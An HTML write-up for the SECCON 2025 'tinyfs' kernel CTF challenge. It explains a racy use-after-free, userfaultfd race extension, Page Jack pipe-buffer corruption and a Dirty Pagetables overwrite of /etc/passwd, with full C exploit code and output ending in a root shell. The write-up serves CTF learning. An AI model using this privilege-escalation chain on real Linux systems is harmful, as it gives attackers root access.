@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>tinyfs write-up</title>
+</head>
+<body>
+        <h1>tinyfs write-up (<a href="./index.html">home</a>)</h1>
+        <h1>Prologue</h1>
+        <p>
+        <code>tinyfs</code> is a CTF challenge that was distributed in seccon qualifiers 2025. The challenge author is ShiftCrops.
+        </p>
+
+<blockquote> When you see a good move, look for a better one -- Emanuel Lasker </blockquote>
+
+<h1>Introduction</h1>
+We are given a vulnerable kernel module (with source code) called <code>tinyfs</code>, and the goal is achieve privilege escalation on a Linux 6.17.8 kernel. The module is a memory-resident filesystem which the init script mounts on <code>/mnt/tiny</code>.
+
+<h1><code>tinyfs.ko</code></h1>
+Despite the name of the module being <em>tiny</em>fs, the module is far from it and would be far too long to show in its entirety here. I will just show the location of the vulnerability,
+
+<pre>
+<code>
+/* File operations: write */
+static ssize_t tiny_fs_file_write(struct file *filp, const char __user *buf, size_t len, loff_t *ppos) {
+	struct inode *inode = file_inode(filp);
+	struct tiny_fs_node *fs_node;
+	struct tiny_fs_sb_info *sbi = SB_FS_INFO(inode->i_sb);
+	ssize_t ret = 0;
+
+	pr_info("tinyfs: write ino=%lu, len=%zu, pos=%lld\n", inode->i_ino, len, *ppos);
+
+	if(!sbi)
+		return -ENOENT;
+	if (*ppos < 0)
+		return -EINVAL;
+
+	fs_node = tiny_fs_find_node_by_ino(sbi, inode->i_ino);
+	if (!fs_node) {
+		ret = -ENOENT;
+		goto ERR;
+	}
+
+	if (*ppos >= TINY_FS_BLOCKSIZE) {
+		ret = -ENOMEM;
+		goto ERR;
+	}
+
+	len = min_t(size_t, len, TINY_FS_BLOCKSIZE - *ppos);
+	if (copy_from_user(fs_node->data + *ppos, buf, len)) {
+		ret = -EFAULT;
+		goto ERR;
+	}
+	*ppos += len;
+
+	mutex_lock(&sbi->lock);
+	if(*ppos > fs_node->size)
+		fs_node->size = *ppos;
+	inode->i_size = fs_node->size;
+	mutex_unlock(&sbi->lock);
+
+	inode_update_timestamps(inode, TINY_FS_TIME_MOD);
+	ret = len;
+
+ERR:
+	pr_debug("tiny_fs_file_write: write end ret=%ld\n", ret);
+	return ret;
+}
+</code>
+</pre>
+
+<code>tiny_fs_file_write</code> contains the vulnerability, and is the <code>write</code> function that the module exports. Before we continue, spend some time and try to acertain what the bug is.
+
+<br>
+<br>
+
+One final warning before I reveal the answer :)
+
+<br>
+<br>
+
+Alright, time for spoilers. Notice just <em>how</em> late the lock is acquired into the write. It is pure insanity. What's more to the point, is that the <code>copy_from_user</code> is unlocked. This means that we can race the file write :o. Let's see what happens if we delete the file, while it's being written to,
+<pre>
+<code>
+static int tiny_fs_remove_object_unsafe(struct tiny_fs_sb_info *sbi, struct tiny_fs_object *fs_object) {
+	struct tiny_fs_node *fs_node;
+
+	if(!sbi || !fs_object)
+		return -1;
+
+	list_del(&fs_object->list);
+	sbi->n_objs--;
+
+	fs_node = fs_object->node;
+	if(!(--fs_node->refcnt)){
+		pr_debug("tiny_fs_remove_object: freeing node for ino=%llu (last link)\n", fs_node->ino);
+
+		/* Only free data when this is the last link */
+		list_del(&fs_node->list);
+		pr_debug("tiny_fs_remove_object: data = %p\n", fs_node->data);
+		if (S_ISREG(fs_node->mode))
+			kfree(fs_node->data);
+		kfree(fs_node);
+	}
+	kfree(fs_object);
+
+	return 0;
+}
+</code>
+</pre>
+
+<p>
+Before you get too excited, the call site for this function is always locked. Anyways, when calling the <code>unlink</code> system call, this function is hit. See that the <code>fs_node->data</code> pointer is freed.
+</p>
+
+<p>
+If we delete the file while it's being written to, then we will be writing into freed memory. This is a user-after-free (UAF) bug :D
+</p>
+
+Before we progress, how can we consistently hit the race condition? This brings us to a cool mechanism called <code>userfaultfd</code>.
+
+<h1><code>userfaultfd (uffd)</code></h1>
+<p>
+Before I continue, I will preface this by saying that this mechanise requires <code>CONFIG_USERFAULTFD=y</code>. If the supplied kernel did not have this enabled, then either FUSE, or fallocate (<a href="https://faith2dxy.xyz/2025-11-28/extending_race_window_fallocate/">fallocate punch hole</a>).
+</p>
+
+<p>
+So what exactly is uffd? Uffd allows userspace threads to handle pagefaults, even pages faulted by a thread running in kernelspace. A thread calls the <code>SYS_userfaultfd</code> system call, and is returned a file descriptor by the kernel. The thread can then use the <code>poll</code> system call to receive notifications about whether a page has been faulted. To inform the kernel about which address to watch, how many pages, and when the fault is handled, the userspace thread simple calls the relevant ioctls on the uffd.
+</p>
+
+<p>
+Lucky for me, I used the <code>kernelinit</code> ctf library, which provides a <code>register_userfault</code> function, that does everything I just said. It spawns another thread, which polls on the uffd, and handles it however I like.
+</p>
+
+<p>
+So, now that we are able to run code on a pagefault, how can we use this to help use hit the race more frequently?
+
+Look at this diagram:
+
+<br>
+_addr__|_present?__|
+<br>
+x + 0: |-unfaulted-|
+<br>
+x + 1: |--faulted--|
+<br>
+x + 2: |--faulted--|
+<br>
+
+Imagine if kernel tries to do a <code>copy_from_user</code> on address <code>x</code>. Then, as the page that <code>x</code> is in is not present, a page fault is raised by the relevent store instruction, and our userspace code is run. Once our userspace handler is finished, the faulting instruction is run again, and userspace contents begin being read at <code>x</code>, Notice that the subsequent addresses are present, and thus, the userspace handler will <em>not</em> be triggered again.
+</p>
+
+<p>
+Therefore, if we setup the write buffer for the <code>write</code> system call which fills a tinyfs file, then the <code>copy_from_user</code> will <em>stall</em> until our handler finishes running. We can then delete the file from <em>within</em> the handler, and allocate a victim object to overwrite with our UAF primitive.
+</p>
+
+<p>
+We can easily setup the situation in the diagram by mapping two contiguous anonymous pages, and faulting the second one. We then pass the last byte of the first page to the <code>write</code> system call, and we have take off :D
+</p>
+
+<h1>Page Jack</h1>
+<p> Before proceeding, not that pipe buffers are typically allocated in cg caches. However, the ctf challenge kernel does not have <code>CONFIG_MEMCG</code> enabled, so pipe buffers will land in a normal cache, as if it were allocated with <code>GFP_KERNEL</code>.
+</p>
+
+<p>
+We have a UAF primitive, but it's quite limited and is definitely not enough to achieve privilege escalation by itself. All we can do is write a zero byte (due to the anonymous mapping) into our UAFd object. We <em>could</em> write 0x00, and then controlled content after that, but we would start over-writing page pointers, and probably cause the kernel to crash. If we try and control the first byte, we would end up faulting address <code>x</code>, and never hit the fault handler. Anyways, that means that Dirty Pipe is out of the picture, since we need to write 0x10 for that to work, and not corrupt anything else.
+</p>
+
+<p>
+Introducing a technique that's nowadays called <a href="https://phrack.org/issues/71/13">Page Jack</a>, although it has existed and been used for quite some time before Phrack published it. Observe the following diagram,
+<br>
+(1) |0x______________00| tail
+<br>
+(2) |0x______________40|
+<br>
+(3) |0x______________80| head
+<br>
+
+These are the page pointers in a pipe buffer that point to <code>struct page</code> which is of size 0x40 bytes. This field of the pipe buffer is only filled when the pipe buffer is written to. In the diagram, we assume that the kernel page allocater has provided contiguous pages to the pipe. Now, imagine if we write 0x00 to the last byte of the third page... then what? It will start pointing to the entry in the first page, and it will look like this,
+<br>
+(1) |0x______________00|
+<br>
+(2) |0x______________40|
+<br>
+(3) |0x______________00| tail
+<br>
+
+Very cool. Let's read <em>all</em> three pages of the pipe. In modern kernels, pipes cache two pages of completely read pipes to minimise the getting and putting of pages. So after reading one page, the pipe looks like,
+<br>
+(1) |0x______________00| first cache entry + tail
+<br>
+(2) |0x______________40| 
+<br>
+(3) |0x______________00| head
+<br>
+
+Reading another page,
+<br>
+(1) |0x______________00| first cache entry
+<br>
+(2) |0x______________40| second cache entry + tail
+<br>
+(3) |0x______________00| head
+<br>
+
+Reading another page,
+<br>
+(1) |0x______________00| first cache entry (free'd)
+<br>
+(2) |0x______________40| second cache entry
+<br>
+(3) |0x______________00| tail and head
+<br>
+
+We completely read the 3rd page which means that page does not get cached, and gets freed. But, the third page is the same as the first page. We just freed our first cache entry! If we now write to the pipe, the pipe will use the first cache entry page (which has just been freed), and we have just upgraded our single byte UAF, to a page UAF!
+</p>
+
+<p>
+Now the question remains, what should the second victim object be so that we can escalate privileges?
+</p>
+
+<h1>Dirty Pagetables</h1>
+<p>
+Like any other modern operating system, the Linux kernel must maintain memory resident pagetables for virtual to physical address translations. These pagetables can be UAF'd like any other kernel object to achieve arbritrary page write.
+</p>
+
+<p>
+Ideally, I want to allocate pagetables, and by extension, PTEs, for a the highly sensetive /etc/passwd file. Overwriting this file gives are direct privilege escalation. We would like to overwrite the last level of pagetables, which are the PTEs. On x86_64, PTEs are 8 bytes in size, meaning that 512 entries exist in a single page. This means that one page worth of PTEs refers to 2MB of physical memory. The first pte must therefore be alligned to 0x2000000.
+</p>
+
+<p>
+All we have to do now is <code>mmap</code> the passwd file at an address alligned to 0x2000000, and hope it falls into out UAFd page. We then just have to ensure that the R/W bit in the PTE is set to 1, and we can then write to the page!
+</p>
+
+<h1>Exploit Code</h1>
+<pre>
+<code>
+#define _GNU_SOURCE
+#include <stdbool.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <string.h>
+#include <unistd.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <poll.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <sys/syscall.h>
+#include <sys/random.h>
+#include <sys/mman.h>
+#include "common.h"  /* kernelinit */
+#include "userfaultfd.h"  /* kernelinit */
+
+#define array_size(arr) (sizeof(arr) / sizeof(*arr))
+
+#define PASSWD_HASH                           "$1$root$9gr5KxwuEdiI80GtIzd.U0"
+#define PAYLOAD                 "root:" PASSWD_HASH ":0:0:root:/root:/bin/sh"
+
+#define PASSWD_PATH    "/etc/passwd"
+#define TINY_FS_MNT    "/mnt/tiny/"
+#define PATTERN        "XXXXXX"
+
+#define FILE_NUM       0x100
+#define SPRAY_SIZE     128
+#define NUM_PIPES      64
+#define PIPE_BUFFER_SZ 40
+#define MAGIC_SIZE     8
+
+static char template[] = TINY_FS_MNT PATTERN;
+char magic_bytes[SPRAY_SIZE][MAGIC_SIZE];
+static char* passwd_maps[FILE_NUM];
+static int pipefds[SPRAY_SIZE][2];
+static int filefds[FILE_NUM];
+static long page_size;
+
+enum flush_status {
+        FLUSH_STAT_DONE,
+        FLUSH_STAT_INPROGRESS,
+};
+
+static inline void err(const char* msg, bool to_exit)
+{
+        errno ? perror(msg) : (void) fputs(msg, stderr);
+
+        if (to_exit) exit(EXIT_FAILURE);
+}
+
+static void flush_tlb(void *addr, size_t len)
+{
+        short *status;
+
+        status = mmap(NULL, sizeof(short), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+
+        *status = FLUSH_STAT_INPROGRESS;
+        if (fork() == 0)
+        {
+                munmap(addr, len);
+                *status = FLUSH_STAT_DONE;
+                sleep(9999);
+        }
+
+        while (*status == FLUSH_STAT_INPROGRESS);
+
+        munmap(status, sizeof(short));
+}
+
+static void fault_handler(void)
+{
+        const size_t write_sz = 3 * page_size;
+        char* buf = NULL;
+        int ret = -1;
+
+        /* release tiny_fs_node->data */
+        ret = unlink(template);
+        if (ret == -1) {
+                err("unlink", false);
+                return;
+        }
+
+        buf = calloc(write_sz, sizeof(*buf));
+        if (!buf) {
+                err("calloc", false);
+                return;
+        }
+
+        puts("[*] unlinked");
+
+        /* resize pipes */
+        for (size_t i = 0; i < SPRAY_SIZE; i++) {
+                ret = fcntl(pipefds[i][0], F_SETPIPE_SZ, NUM_PIPES * page_size);
+                if (ret == -1) {
+                        err("fcntl", false);
+                        return;
+                }
+        }
+
+        puts("[*] pipes resized");
+
+        /* allocate four pipe_buffers */
+        for (size_t i = 0; i < SPRAY_SIZE; i++) {
+                memcpy(buf, magic_bytes[i], sizeof(magic_bytes[i]));
+
+                ret = write(pipefds[i][1], buf, write_sz);
+                if (ret == -1) {
+                        err("write @ child", false);
+                        return;
+                }
+        }
+
+        return;
+
+}
+
+int main (void)
+{
+        page_size = sysconf(_SC_PAGESIZE);
+        const size_t read_sz = 3 * page_size;
+        const uintptr_t addr = 0x1337000;
+        const unsigned char payload = 0xFF;
+        ssize_t target_pipe = -1;
+        char* passwd_map = NULL;
+        int tiny_fs_fd = -1;
+        char* vsret = NULL;
+        off_t offset = -1;
+        char* buf = NULL;
+        int ipid = -1;
+        int ssret = -1;
+        int ret = -1;
+
+        /* initialise magic bytes */
+        for (size_t i = 0; i < SPRAY_SIZE; i++) {
+                ssret = getrandom(magic_bytes[i], 8, 0);
+                if (ssret == -1)
+                        err("getrandom", true);
+                for (size_t j = 0; j < MAGIC_SIZE; j++)
+                        printf("%lu: 0x%x, ", i, magic_bytes[i][j] & 0xFF);
+                puts("");
+        }
+
+        puts("[*] random bytes generated");
+
+        getchar();
+
+        /* open /etc/passwd files */
+        for (size_t i = 0; i < 1; i++) {
+                ret = open(PASSWD_PATH, O_RDONLY);
+                if (ret == -1)
+                        fatal("open");
+
+                filefds[i] = ret;
+        }
+
+
+        buf = calloc(read_sz, sizeof(*buf));
+        if (!buf)
+                err("calloc", true);
+
+        /* spray pages */
+        for (size_t i = 0; i < SPRAY_SIZE; i++) {
+                int spray_pipefd[2] = { 0 };
+
+                ret = pipe(spray_pipefd);
+                if (ret == -1)
+                        err("pipe", true);
+
+                ret = fcntl(spray_pipefd[0], F_SETPIPE_SZ, NUM_PIPES * page_size);
+                if (ret == -1) {
+                        err("fcntl", false);
+                }
+        }
+
+        puts("[*] pages sprayed");
+
+        getchar();
+
+        /* spray initial pipes */
+        for (size_t i = 0; i < SPRAY_SIZE; i++) {
+                ret = pipe(pipefds[i]);
+                if (ret == -1)
+                        err("pipe", true);
+        }
+
+        puts("[*] pipes allocated");
+
+        /*
+         * map second page into memory
+         * keep first page unmapped, so copy_from_user fails
+         */
+        vsret = mmap((char*) addr, 2 * page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+        if (vsret == MAP_FAILED || vsret != (char*) addr)
+                err("mmap", true);
+
+        puts("[*] pages mapped");
+
+        /* fault the page into memory */
+        *(vsret + page_size) = '\0';
+
+        puts("[*] page faulted");
+
+        /* create uffd */
+        ipid = register_userfault((void*) addr, fault_handler);
+        if (ipid == -1)
+                err("clone", true);
+
+        /* create temp file in tinyfs */
+        tiny_fs_fd = mkstemp(template);
+        if (tiny_fs_fd == -1)
+                err("mkstemp", true);
+
+        /* seek the correct pipe buffer */
+        offset = lseek(tiny_fs_fd, 2 * PIPE_BUFFER_SZ, SEEK_SET);
+        if (offset == -1)
+                err("lseek", true);
+
+        /* write dummy data */
+        //for (size_t i = 1; i < 40; i++)
+        //        *(vsret + page_size + i - 1) = i;
+
+        /* fault the first page */
+        write(tiny_fs_fd, (char*) addr + page_size - 1, 1);
+        //if (ssret == -1)
+        //        err("write @ parent", true);
+
+        puts("[*] fault handled");
+
+        /*
+         * free two pipe buffers
+         * pipe buffers pages get put in tmp array cache
+         */
+        for (size_t i = 0; i < SPRAY_SIZE; i++) {
+                ssret = read(pipefds[i][0], buf, read_sz);
+                if (ssret == -1)
+                        err("read", true);
+
+                printf("last byte = 0x%x\n", buf[2 * page_size] & 0xFF);
+                if (buf[2 * page_size]) {
+                        printf("[*] found something @ %lu\n", i);
+                        getchar();
+                }
+
+                if (!memcmp(&buf[2 * page_size], magic_bytes[i], sizeof(magic_bytes[i]))) {
+                        target_pipe = i;
+                        puts("[*] page jack'd");
+                        getchar();
+                        break;
+                }
+        }
+
+        if (target_pipe == -1) {
+                puts("[*] page jack failed... exiting");
+                exit(EXIT_FAILURE);
+        }
+
+        for (size_t i = 0; i < 1; i++) {
+                passwd_map = mmap((void*)(0x1400000), 512 * page_size, PROT_READ, MAP_FIXED | MAP_POPULATE | MAP_SHARED, filefds[i], 0);
+                if (passwd_map == MAP_FAILED)
+                        err("mmap", true);
+        }
+
+        puts("[*] pte sprayed");
+
+        getchar();
+
+        /* corrupt pte */
+        ssret = write(pipefds[target_pipe][1], &payload, sizeof(payload));
+        if (ssret != sizeof(payload))
+                fatal("write");
+
+        puts("[*] pte corrupted");
+
+        getchar();
+
+        //flush_tlb(passwd_map, 512 * page_size);
+
+        puts("[*] tlb flushed");
+
+        getchar();
+
+        memcpy(passwd_map, PAYLOAD, sizeof(PAYLOAD));
+
+        system("cat /etc/passwd");
+
+        return EXIT_FAILURE;
+}
+</code>
+</pre>
+
+<h1>Exploit output (truncated)</h1>
+<pre>
+<code>
+[*] pages mapped
+[*] page faulted
+tinyfs: lookup 'eHHHLJ' in ino=1
+tinyfs: create 'eHHHLJ' in ino=1 (uid=1337, gid=1337)
+tinyfs: write ino=5, len=1, pos=80
+faulting here: 0x1337000
+tinyfs: unlink 'eHHHLJ' (ino=5, nlink=1)
+[*] unlinked
+[*] pipes resized
+[*] fault handled
+last byte = 0x0
+last byte = 0x6d
+[*] found something @ 1
+
+[*] page jack'd
+
+[*] pte sprayed
+
+[*] pte corrupted
+
+[*] tlb flushed
+
+root:$1$root$9gr5KxwuEdiI80GtIzd.U0:0:0:root:/root:/bin/sh:/bin/false
+bin:x:2:2:bin:/bin:/bin/false
+sys:x:3:3:sys:/dev:/bin/false
+sync:x:4:100:sync:/bin:/bin/sync
+mail:x:8:8:mail:/var/spool/mail:/bin/false
+www-data:x:33:33:www-data:/var/www:/bin/false
+operator:x:37:37:Operator:/var:/bin/false
+nobody:x:65534:65534:nobody:/home:/bin/false
+ctf:x:1337:1337:CTF Challenger:/:/bin/sh
+tinyfs: evict_inode called for ino=5
+$ su root
+Password:
+$ id
+uid=0(root) gid=0(root) groups=0(root),10(wheel)
+</code>
+</pre>
+
+<h1>Epilogue</h1>
+<p>
+The exploit is extremely, and embarressingly unreliable. You may have to run it 100 times for it wo work. I attribute the unreliability to the fact that we can't assume that the pipe pages are contiguous. I did try and initial page spray to drain the buddy allocator free list, and ensure pipe gets fresh pages, but that didn't seem to help.
+</p>
+
+<p>
+For some reason, I didn't have to flush the tlb to get the corrupted page mappings
+</p>
+
+<p>
+I also wrote random bytes to the first page of each corrupted pipe buffer. That way, if I read the third page, and it ended up with the same contents as the first page, I've guaranteed a page jack. <em>Do not</em> write the <em>same</em> magic byte contents to each pipe. I did that, and kept thinking I have page jack'd, when in reality, I had corrupted one pipe's pages to point to another pipe's pages. Very annoying to find out.
+</p>
+
+<p>
+Anyways, I hope you enjoyed the post, and do let me know if I should provide more detail or improve upon it :)
+</p>
+</body>
+</html>
